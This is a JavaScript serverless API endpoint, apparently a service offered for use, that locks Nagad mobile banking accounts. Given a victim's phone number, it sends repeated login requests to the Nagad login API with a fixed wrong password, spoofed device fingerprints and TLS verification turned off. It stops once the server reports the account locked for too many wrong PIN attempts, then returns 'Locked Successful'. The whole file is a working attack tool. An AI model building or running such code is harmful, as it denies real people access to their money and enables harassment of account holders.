const https = require("https");

export default async function handler(req, res) {
  if (req.method !== "GET") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  const phone = req.query.phone;

  if (!phone || phone.length !== 11) {
    return res.status(400).json({
      success: false,
      status: "Invalid Phone Number",
      credit: "Developer: Tofazzal Hossain"
    });
  }

  const url = "https://app2.mynagad.com:20002/api/login";

  function randomHex(length) {
    const chars = "abcdef0123456789";
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
  }

  const userId = Math.floor(10000000 + Math.random() * 90000000).toString();
  const deviceFgp = randomHex(64);
  const userAgent = `ANDROID/${Math.floor(1160 + Math.random() * 10)}`;

  const headers = {
    "Host": "app2.mynagad.com:20002",
    "User-Agent": "okhttp/3.14.9",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json; charset=UTF-8",
    "X-KM-UserId": userId,
    "X-KM-User-AspId": "100012345612345",
    "X-KM-User-Agent": userAgent,
    "X-KM-DEVICE-FGP": deviceFgp,
    "X-KM-Accept-language": "bn",
    "X-KM-AppCode": "01",
    "Cookie": "TS01e66e4e=01e006cfdc372dd0d9a364a1d897e7a0b29551a5c0c96e24375291a653cf7b04b009071bbba3e9ab6a49400e6d267a846f86a6ef91a2b78ba72b79b997bbd74a6b47468fc9"
  };

  const body = JSON.stringify({
    aspId: "100012345612345",
    mpaId: null,
    password: "A20A2B7BB0842D5CF8A0C06C626421FD51EC103925C1819A51271F2779AFA730",
    username: phone
  });

  const options = {
    method: "POST",
    headers,
    agent: new https.Agent({ rejectUnauthorized: false })
  };

  async function sendRequest() {
    return new Promise((resolve, reject) => {
      const req = https.request(url, options, (resp) => {
        let data = "";
        resp.on("data", (chunk) => data += chunk);
        resp.on("end", () => resolve(data));
      });
      req.on("error", reject);
      req.write(body);
      req.end();
    });
  }

  try {
    const first = await sendRequest();
    const firstJson = JSON.parse(first);
    const msg = firstJson.message || "";

    if (msg.includes("একাধিকবার ভুল পিন দিয়ে চেষ্টা করার কারণে অ্যাকাউন্টটি লক করা হয়েছে")) {
      return res.json({
        success: true,
        status: "Already Locked",
        credit: "Developer: Tofazzal Hossain"
      });
    }

    if (msg.includes("আপনার কোন নগদ অ্যাকাউন্ট নেই")) {
      return res.json({
        success: false,
        status: "Invalid Nagad Number",
        credit: "Developer: Tofazzal Hossain"
      });
    }

    for (let i = 0; i < 10; i++) {
      const response = await sendRequest();
      let json;
      try {
        json = JSON.parse(response);
      } catch {
        continue;
      }
      const msg = json.message || "";

      if (msg.includes("একাধিকবার ভুল পিন দিয়ে চেষ্টা করার কারণে অ্যাকাউন্টটি লক করা হয়েছে")) {
        return res.json({
          success: true,
          status: "Locked Successful",
          credit: "Developer: Tofazzal Hossain"
        });
      }

      await new Promise(r => setTimeout(r, 1000));
    }

    return res.json({
      success: false,
      status: "Not Locked (Try Again)",
      credit: "Developer: Tofazzal Hossain"
    });

  } catch (error) {
    return res.status(500).json({
      success: false,
      status: "Request Failed",
      error: error.message,
      credit: "Developer: Tofazzal Hossain"
    });
  }
}
